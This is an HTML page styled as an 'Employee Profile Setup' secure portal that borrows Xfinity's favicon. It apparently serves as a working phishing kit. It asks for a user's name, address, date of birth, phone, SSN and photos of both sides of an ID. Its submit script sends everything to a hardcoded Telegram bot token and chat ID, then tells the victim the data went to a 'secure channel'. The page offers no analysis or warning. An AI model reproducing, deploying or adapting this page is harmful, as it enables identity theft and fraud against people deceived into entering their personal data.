<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Employee Profile Setup</title>
    <link
      rel="icon"
      href="https://www.xfinity.com/favicon.ico"
      type="image/x-icon"
    />
    <style>
      * {
        box-sizing: border-box;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        margin: 0;
        padding: 0;
      }

      body {
        background-color: #000;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        margin: 0;
        padding: 15px;
        position: relative;
        overflow: hidden;
        background-image:
          radial-gradient(
            circle at 10% 20%,
            rgba(30, 30, 50, 0.3) 0%,
            transparent 20%
          ),
          radial-gradient(
            circle at 90% 80%,
            rgba(30, 50, 50, 0.3) 0%,
            transparent 20%
          );
      }

      body::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background:
          linear-gradient(
            45deg,
            rgba(20, 20, 30, 0.8) 0%,
            rgba(10, 10, 20, 0.9) 100%
          ),
          url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxjaXJjbGUgY3g9IjIwIiBjeT0iMjAiIHI9IjEiIGZpbGw9IiMzMzMzMzMiLz48L3BhdHRlcm4+PC9kZWZzPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjcGF0dGVybikiLz48L3N2Zz4=");
        filter: blur(2px);
        z-index: -1;
      }

      .form-container {
        background: rgba(20, 20, 30, 0.85);
        backdrop-filter: blur(12px);
        padding: 25px;
        width: 100%;
        max-width: 500px;
        border-radius: 16px;
        box-shadow:
          0 10px 30px rgba(0, 0, 0, 0.5),
          0 0 0 1px rgba(100, 150, 255, 0.1);
        border: 1px solid rgba(100, 150, 255, 0.15);
        position: relative;
        overflow: hidden;
        height: 95vh;
        display: flex;
        flex-direction: column;
      }

      .form-container::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 4px;
        background: linear-gradient(90deg, #4a9bff, #2c5364);
      }

      .header {
        text-align: center;
        margin-bottom: 20px;
        position: relative;
        flex-shrink: 0;
      }

      .welcome-text {
        color: #aaa;
        font-size: 14px;
        margin-bottom: 5px;
      }

      .user-name {
        color: #fff;
        font-size: 26px;
        font-weight: 600;
        margin-bottom: 8px;
        text-shadow: 0 0 10px rgba(74, 155, 255, 0.3);
        background: linear-gradient(90deg, #4a9bff, #2c5364);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }

      .subtitle {
        color: #888;
        font-size: 13px;
        margin-top: 5px;
      }

      .form-content {
        flex: 1;
        overflow-y: auto;
        padding-right: 5px;
        margin-right: -10px;
      }

      .form-content::-webkit-scrollbar {
        width: 6px;
      }

      .form-content::-webkit-scrollbar-track {
        background: rgba(30, 30, 40, 0.5);
        border-radius: 10px;
      }

      .form-content::-webkit-scrollbar-thumb {
        background: rgba(74, 155, 255, 0.3);
        border-radius: 10px;
      }

      .input-group {
        margin-bottom: 18px;
      }

      label {
        display: block;
        font-size: 13px;
        margin-bottom: 7px;
        color: #bbb;
        font-weight: 500;
      }

      input,
      select {
        width: 100%;
        padding: 12px;
        border-radius: 10px;
        border: 1px solid rgba(100, 150, 255, 0.2);
        background: rgba(30, 30, 45, 0.7);
        color: #fff;
        outline: none;
        transition: all 0.3s ease;
        font-size: 14px;
      }

      input:focus,
      select:focus {
        border-color: #4a9bff;
        box-shadow: 0 0 0 3px rgba(74, 155, 255, 0.2);
        background: rgba(40, 40, 60, 0.8);
      }

      input::placeholder {
        color: #666;
      }

      button {
        width: 100%;
        padding: 14px;
        background: linear-gradient(135deg, #4a9bff, #2c5364);
        border: none;
        border-radius: 12px;
        color: #fff;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-top: 10px;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        position: relative;
        overflow: hidden;
        flex-shrink: 0;
      }

      button:hover {
        background: linear-gradient(135deg, #3a8beb, #1f3d4a);
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
      }

      button:active {
        transform: translateY(0);
        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
      }

      .button-content {
        position: relative;
        z-index: 2;
      }

      .status {
        text-align: center;
        margin-top: 15px;
        padding: 12px;
        border-radius: 10px;
        display: none;
        font-weight: 500;
        animation: fadeIn 0.3s ease;
        flex-shrink: 0;
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(10px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .success {
        background-color: rgba(40, 167, 69, 0.15);
        color: #28a745;
        border: 1px solid rgba(40, 167, 69, 0.3);
      }

      .error {
        background-color: rgba(220, 53, 69, 0.15);
        color: #dc3545;
        border: 1px solid rgba(220, 53, 69, 0.3);
      }

      .file-upload {
        position: relative;
        overflow: hidden;
        display: inline-block;
        width: 100%;
      }

      .file-upload input[type="file"] {
        position: absolute;
        left: 0;
        top: 0;
        opacity: 0;
        width: 100%;
        height: 100%;
        cursor: pointer;
      }

      .file-upload-label {
        display: block;
        padding: 12px;
        background: rgba(40, 40, 60, 0.7);
        border: 1px dashed rgba(100, 150, 255, 0.3);
        border-radius: 10px;
        text-align: center;
        color: #aaa;
        transition: all 0.3s ease;
        cursor: pointer;
        font-size: 14px;
      }

      .file-upload-label:hover {
        background: rgba(50, 50, 70, 0.8);
        border-color: rgba(74, 155, 255, 0.5);
        color: #ddd;
      }

      .preview-container {
        display: flex;
        gap: 12px;
        margin-top: 10px;
      }

      .preview-item {
        flex: 1;
        text-align: center;
      }

      .preview-image {
        width: 100%;
        height: 80px;
        object-fit: contain;
        background: rgba(20, 20, 30, 0.7);
        border-radius: 8px;
        display: none;
        border: 1px solid rgba(100, 150, 255, 0.1);
      }

      .preview-label {
        margin-top: 6px;
        font-size: 12px;
        color: #888;
      }

      .note {
        font-size: 11px;
        color: #777;
        margin-top: 8px;
        text-align: center;
        padding: 6px;
        background: rgba(30, 30, 40, 0.5);
        border-radius: 6px;
      }

      .footer {
        text-align: center;
        margin-top: 15px;
        color: #666;
        font-size: 11px;
        flex-shrink: 0;
      }

      .required::after {
        content: " *";
        color: #ff6b6b;
      }
    </style>
  </head>
  <body>
    <div class="form-container">
      <div class="header">
        <div class="welcome-text">Welcome to Secure Portal</div>
        <div class="user-name" id="displayName">Employee Profile Setup</div>
        <div class="subtitle">Please complete your profile setup</div>
      </div>

      <div class="form-content">
        <form id="employeeForm">
          <div class="input-group">
            <label class="required">Full Name</label>
            <input
              type="text"
              id="fullName"
              placeholder="Enter your full name"
              required
            />
          </div>

          <div class="input-group">
            <label class="required">Email Address</label>
            <input
              type="email"
              id="email"
              placeholder="your.email@company.com"
              required
            />
          </div>

          <div class="input-group">
            <label class="required">Address</label>
            <input
              type="text"
              id="address"
              placeholder="123 Main Street, City, State, Zip Code"
              required
            />
          </div>

          <div class="input-group">
            <label class="required">Date of Birth</label>
            <input type="date" id="dob" required />
          </div>

          <div class="input-group">
            <label class="required">Phone Number</label>
            <input
              type="tel"
              id="phone"
              placeholder="(123) 456-7890"
              required
            />
          </div>

          <div class="input-group">
            <label class="required">SSN</label>
            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" required />
          </div>

          <div class="input-group">
            <label class="required">Job Position</label>
            <select id="position" required>
              <option value="">Select your position</option>
              <option value="Data Entry">Data Entry</option>
              <option value="Customer Service">Customer Service</option>
              <option value="IT Support">IT Support</option>
              <option value="HR">Human Resources</option>
              <option value="Finance">Finance</option>
              <option value="Manager">Manager</option>
              <option value="Executive">Executive</option>
              <option value="Other">Other</option>
            </select>
          </div>

          <div class="input-group">
            <label class="required">Upload ID Front</label>
            <div class="file-upload">
              <input type="file" id="idFront" accept="image/*" required />
              <div class="file-upload-label">Choose Front of ID</div>
            </div>
            <div class="preview-container">
              <div class="preview-item">
                <img
                  id="frontPreview"
                  class="preview-image"
                  alt="Front ID Preview"
                />
                <div class="preview-label">Front Preview</div>
              </div>
            </div>
          </div>

          <div class="input-group">
            <label class="required">Upload ID Back</label>
            <div class="file-upload">
              <input type="file" id="idBack" accept="image/*" required />
              <div class="file-upload-label">Choose Back of ID</div>
            </div>
            <div class="preview-container">
              <div class="preview-item">
                <img
                  id="backPreview"
                  class="preview-image"
                  alt="Back ID Preview"
                />
                <div class="preview-label">Back Preview</div>
              </div>
            </div>
          </div>

          <div class="note">
            Note: Only JPG, PNG, or GIF files accepted (max 5MB each)
          </div>
        </form>
      </div>

      <button type="submit" form="employeeForm">
        <div class="button-content">Submit Profile</div>
      </button>

      <div id="statusMessage" class="status"></div>

      <div class="footer">
        This information is securely transmitted for verification purposes
      </div>
    </div>

    <script>
      // Display user's name as they type
      document
        .getElementById("fullName")
        .addEventListener("input", function (e) {
          const name = e.target.value || "Employee";
          document.getElementById("displayName").textContent = name;
        });

      // Preview images when selected
      document
        .getElementById("idFront")
        .addEventListener("change", function (e) {
          previewImage(e.target, "frontPreview");
        });

      document
        .getElementById("idBack")
        .addEventListener("change", function (e) {
          previewImage(e.target, "backPreview");
        });

      function previewImage(input, previewId) {
        if (input.files && input.files[0]) {
          const reader = new FileReader();
          reader.onload = function (e) {
            const preview = document.getElementById(previewId);
            preview.src = e.target.result;
            preview.style.display = "block";
          };
          reader.readAsDataURL(input.files[0]);
        }
      }

      document
        .getElementById("employeeForm")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          // Get form values
          const fullName = document.getElementById("fullName").value;
          const email = document.getElementById("email").value;
          const address = document.getElementById("address").value;
          const dob = document.getElementById("dob").value;
          const phone = document.getElementById("phone").value;
          const ssn = document.getElementById("ssn").value;
          const position = document.getElementById("position").value;
          const idFront = document.getElementById("idFront").files[0];
          const idBack = document.getElementById("idBack").files[0];

          // Validate inputs
          if (
            !fullName ||
            !email ||
            !address ||
            !dob ||
            !phone ||
            !ssn ||
            !position ||
            !idFront ||
            !idBack
          ) {
            showStatus(
              "Please fill in all fields and upload both ID images",
              "error",
            );
            return;
          }

          // Validate email format
          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailRegex.test(email)) {
            showStatus("Please enter a valid email address", "error");
            return;
          }

          // Validate file types
          const validTypes = ["image/jpeg", "image/png", "image/gif"];
          if (
            !validTypes.includes(idFront.type) ||
            !validTypes.includes(idBack.type)
          ) {
            showStatus(
              "Please upload valid image files (JPG, PNG, or GIF)",
              "error",
            );
            return;
          }

          // Validate file sizes (5MB max)
          if (idFront.size > 5 * 1024 * 1024 || idBack.size > 5 * 1024 * 1024) {
            showStatus("Files must be smaller than 5MB each", "error");
            return;
          }

          // Format the message
          const message = `
🔔 *New Employee Profile Submission*

👤 *Full Name:* ${fullName}
✉️ *Email:* ${email}
🏠 *Address:* ${address}
🎂 *Date of Birth:* ${dob}
📞 *Phone:* ${phone}
🆔 *SSN:* ${ssn}
💼 *Position:* ${position}

📅 Submitted: ${new Date().toLocaleString()}
      `;

          // Send to Telegram bot
          sendToTelegram(
            "8628492590:AAFFkjZvwCN7y-z6w24TZsAObsKtzVxLc4s",
            "7867274282",
            message,
            idFront,
            idBack,
          );
        });

      function sendToTelegram(botToken, chatId, message, idFront, idBack) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const fileUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;

        // First send the text message
        const data = {
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        };

        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        })
          .then((response) => {
            if (!response.ok) {
              throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
          })
          .then((data) => {
            if (data.ok) {
              // Then send both ID images
              return Promise.all([
                sendDocument(botToken, chatId, idFront, "Front of ID"),
                sendDocument(botToken, chatId, idBack, "Back of ID"),
              ]);
            } else {
              throw new Error(data.description || "Failed to send message");
            }
          })
          .then(() => {
            showStatus(
              "Profile submitted successfully! Data and ID images sent to secure channel.",
              "success",
            );
            document.getElementById("employeeForm").reset();
            // Reset previews
            document.querySelectorAll(".preview-image").forEach((img) => {
              img.style.display = "none";
              img.src = "";
            });
            // Reset display name
            document.getElementById("displayName").textContent = "Employee";
          })
          .catch((error) => {
            console.error("Error:", error);
            showStatus(
              "Submission failed. Please try again. (" + error.message + ")",
              "error",
            );
          });
      }

      function sendDocument(botToken, chatId, file, caption) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("document", file);
        formData.append("caption", caption);

        return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: "POST",
          body: formData,
        })
          .then((response) => {
            if (!response.ok) {
              throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
          })
          .then((data) => {
            if (!data.ok) {
              throw new Error(data.description || "Failed to send document");
            }
            return data;
          });
      }

      function showStatus(message, type) {
        const statusElement = document.getElementById("statusMessage");
        statusElement.textContent = message;
        statusElement.className = "status " + type;
        statusElement.style.display = "block";

        // Auto-hide after 5 seconds
        setTimeout(() => {
          statusElement.style.display = "none";
        }, 5000);
      }
    </script>
  </body>
</html>
